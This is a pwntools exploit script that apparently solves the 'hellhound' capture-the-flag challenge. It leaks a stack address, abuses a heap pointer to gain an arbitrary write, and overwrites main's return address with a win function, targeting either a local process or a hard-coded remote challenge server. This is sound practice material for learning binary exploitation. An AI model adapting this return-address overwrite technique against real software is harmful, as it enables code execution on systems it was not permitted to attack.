#!/usr/bin/env python3

from pwn import *

the_binary = "./hellhound"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("138.68.150.120", 30220)
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, """
        continue
    """)

def choice(num):
    io.sendlineafter(b">> ", str(num).encode())

def set_heap_ptr(where):
    choice(2)
    io.send(b"\x00"*8 + p64(where) + b"\x00"*8)
    choice(3)

def read_from_heap_ptr():
    choice(1)
    io.recvuntil(b"number: [")
    return int(io.recvuntil(b"]", drop=True))

def arb_write(what, where, next_heap_ptr):
    assert len(what) == 8

    set_heap_ptr(where)
    choice(2)
    io.send(what + next_heap_ptr)
    choice(3)

stack_leak = read_from_heap_ptr()
log.info("Stack leak: %#x" % stack_leak)

# Overwrite main's return address on the stack with the win gadget. We set the next heap pointer
# to NULL so the free(heap_ptr) call passes.
arb_write(p64(elf.sym.berserk_mode_off), stack_leak + 0x50, b"\x00"*8)

# Trigger program exit
choice(69)
io.interactive()
